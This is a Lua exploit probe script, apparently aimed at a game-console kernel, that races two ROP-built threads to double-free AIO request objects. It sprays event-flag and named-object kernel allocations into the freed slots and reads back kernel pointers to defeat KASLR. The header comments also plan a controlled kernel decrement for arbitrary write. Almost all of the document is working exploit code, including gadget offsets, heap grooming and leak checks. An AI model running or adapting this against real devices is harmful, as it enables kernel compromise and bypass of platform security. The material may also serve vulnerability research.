-- CRASH_CLASS: HIGH
-- PROBE 69s: Controlled kernel write via AIO double-free + spray
--
-- THEORY: After double-freeing R-object (48B, 64B bucket):
--   1. R slot appears twice on UMA free list
--   2. Spray EVFs (538) -> one EVF reclaims R's slot
--   3. New AIO submit (669) -> new R allocation gets same slot
--      -> new R overwrites EVF's kernel data with curthread pointers
--   4. EVF trywait/wait reads the contaminated data back
--
-- The I-object (88B, 128B bucket) has: lock xadd [*(I+0x40)+0x28], -1
-- If we control I+0x40 via spray, we get an arbitrary decrement.
-- BUT: if I+0x40 points to unmapped memory, kernel panics.
-- This probe is DEFENSIVE: it measures whether process survives
-- after double-free + spray, which tells us if the decrement landed.
--
-- Section A: pure R-object KASLR (read kernel pointers through EVF)
-- Section B: defensive I-object test (survive = decrement hit mapped memory)

print("=== PROBE 69s: CONTROLLED KERNEL WRITE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa_ig = memory.alloc(0x20)
wq(N(sa_ig), uint64(1)); wd(N(sa_ig) + 8, 0); wq(N(sa_ig) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_ig, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_ig, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_ig, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(one_id)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- ============================================================
-- [A] KASLR via R-object: double-free -> EVF spray -> AIO submit -> readback
-- ============================================================
print("")
print("[A] KASLR: double-free R -> spray EVFs -> submit new AIO -> EVF readback")
print("  R+0x00 = curthread+0x390, R+0x08 = curthread+0x08")
print("  If EVF reclaims R, and new AIO submit overwrites it with fresh kthread ptrs,")
print("  EVF readback should expose kernel addresses")
print("")

local ITERS = 20
local EVF_SPRAY = 200
local total_kptrs = 0
local kptr_values = {}

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit + poll BATCH AIO requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then
        print(string.format("  iter %d: only %d IDs", iter, #ids))
        break
    end

    -- Prepare delete arrays
    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Double-free via concurrent children
    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        -- No doubles this iteration
    else
        -- PHASE 1: Spray EVFs to reclaim one copy of the freed R slots
        local evf_handles = {}
        for i = 1, EVF_SPRAY do
            local nm = put_str(string.format("s%d_%d", iter, i))
            local ret = nil
            pcall(function()
                ret = mk(538)(uint64(N(nm)), uint64(0xDEAD0000 + i))
            end)
            if ret then
                local h, l = get_hi_lo(ret)
                if l ~= 0xFFFFFFFF then
                    table.insert(evf_handles, ret)
                end
            end
        end

        -- PHASE 2: Submit new AIO to fill the second copy of the freed R slots
        -- This overwrites the EVF's data with fresh curthread pointers
        local new_ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then
                poll_one(id)
                table.insert(new_ids, id)
            end
        end

        -- PHASE 3: Check EVF handles for contamination
        -- evf_trywait(543): 3 args (handle, bits, mode)
        -- evf_wait(542): 5 args (handle, bits, mode, result_ptr, timeout)
        local result_buf = memory.alloc(16)
        local iter_kptrs = 0

        for idx, h in ipairs(evf_handles) do
            -- First try 543 trywait — returns status
            local tw_ret = nil
            pcall(function()
                tw_ret = mk(543)(h, uint64(0xFFFFFFFF), uint64(1))
            end)

            -- Also try 542 wait with 0 timeout for result bits
            wq(N(result_buf), uint64(0xDEADDEADDEADDEAD))
            wq(N(result_buf) + 8, uint64(0xDEADDEADDEADDEAD))
            pcall(function()
                mk(542)(h, uint64(0xFFFFFFFF), uint64(1), uint64(N(result_buf)), uint64(0))
            end)

            -- Check result_buf for kernel pointers
            local r0 = rq(uint64(string.format("0x%X", N(result_buf))))
            local r1 = rq(uint64(string.format("0x%X", N(result_buf) + 8)))

            if is_kptr(r0) then
                print(string.format("  *** KPTR in EVF result[0] @ evf#%d: %s", idx, fmt(r0)))
                iter_kptrs = iter_kptrs + 1
                table.insert(kptr_values, fmt(r0))
            end
            if is_kptr(r1) then
                print(string.format("  *** KPTR in EVF result[8] @ evf#%d: %s", idx, fmt(r1)))
                iter_kptrs = iter_kptrs + 1
                table.insert(kptr_values, fmt(r1))
            end

            -- Also check tw_ret itself
            if tw_ret and is_kptr(tw_ret) then
                print(string.format("  *** KPTR in trywait ret @ evf#%d: %s", idx, fmt(tw_ret)))
                iter_kptrs = iter_kptrs + 1
                table.insert(kptr_values, fmt(tw_ret))
            end
        end

        total_kptrs = total_kptrs + iter_kptrs
        if iter_kptrs > 0 then
            print(string.format("  *** iter %d: %d KERNEL POINTERS FOUND (doubles=%d)", iter, iter_kptrs, doubles))
        else
            print(string.format("  iter %d: %d doubles, %d EVFs, %d new AIO, 0 kptrs",
                iter, doubles, #evf_handles, #new_ids))
        end

        -- Clean up EVFs
        for _, h2 in ipairs(evf_handles) do
            pcall(function() mk(539)(h2) end)
        end
        -- Delete new AIO
        for _, id in ipairs(new_ids) do
            wd(N(one_id), id); wd(N(one_st), 0)
            pcall(function()
                mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
            end)
        end
    end
end

print("")
print(string.format("[A] TOTAL KERNEL POINTERS: %d", total_kptrs))
for i, v in ipairs(kptr_values) do
    print(string.format("  #%d: %s", i, v))
end

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] NAMEDOBJ spray variant (557 objects may be closer to 48B)
-- ============================================================
print("")
print("[B] KASLR via namedobj(557) spray instead of EVF")

local total_kptrs_b = 0
local kptr_values_b = {}

for iter = 1, 10 do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    if #ids < 8 then break end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 40000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then break end
    if doubles == 0 then
        print(string.format("  iter %d: 0 doubles", iter))
    else
        -- Spray namedobjs with 48-byte names (fill 64B bucket exactly)
        local nobj_handles = {}
        for i = 1, 200 do
            -- 48-char name = fits 64B bucket with NUL and small header
            local nm = put_str(string.format("NNNNNNNNNNNNNNNNNNNNNNNNNNNN%04d_%02d_%08d", iter, i, 0xDEAD))
            local ret = nil
            pcall(function() ret = mk(557)(uint64(N(nm))) end)
            if ret then
                local h, l = get_hi_lo(ret)
                if l ~= 0xFFFFFFFF then
                    table.insert(nobj_handles, {handle = ret, name = nm})
                end
            end
        end

        -- Submit new AIO to overwrite the overlapping namedobj
        local new_ids = {}
        for i = 1, BATCH do
            local id = submit_one()
            if id ~= 0 then poll_one(id); table.insert(new_ids, id) end
        end

        -- Try to read back via namedobj lookup (540)
        local iter_kptrs = 0
        for idx, nobj in ipairs(nobj_handles) do
            local lookup_ret = nil
            pcall(function()
                lookup_ret = mk(540)(nobj.name)
            end)
            if lookup_ret and is_kptr(lookup_ret) then
                print(string.format("  *** KPTR in namedobj lookup #%d: %s", idx, fmt(lookup_ret)))
                iter_kptrs = iter_kptrs + 1
                table.insert(kptr_values_b, fmt(lookup_ret))
            end
        end

        total_kptrs_b = total_kptrs_b + iter_kptrs
        print(string.format("  iter %d: %d doubles, %d nobjs, %d kptrs",
            iter, doubles, #nobj_handles, iter_kptrs))

        -- Clean up
        for _, nobj in ipairs(nobj_handles) do
            pcall(function() mk(558)(nobj.handle) end)
        end
        for _, id in ipairs(new_ids) do
            wd(N(one_id), id); wd(N(one_st), 0)
            pcall(function()
                mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
            end)
        end
    end
end

print(string.format("[B] TOTAL KERNEL POINTERS: %d", total_kptrs_b))

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("EVF spray:     %d kernel pointers", total_kptrs))
print(string.format("Namedobj spray: %d kernel pointers", total_kptrs_b))
if total_kptrs > 0 or total_kptrs_b > 0 then
    print("*** KASLR DEFEAT CANDIDATE ***")
    print("Unique values:")
    local seen = {}
    for _, v in ipairs(kptr_values) do
        if not seen[v] then print("  " .. v); seen[v] = true end
    end
    for _, v in ipairs(kptr_values_b) do
        if not seen[v] then print("  " .. v); seen[v] = true end
    end
end
print("")
print("=== PROBE 69s COMPLETE ===")
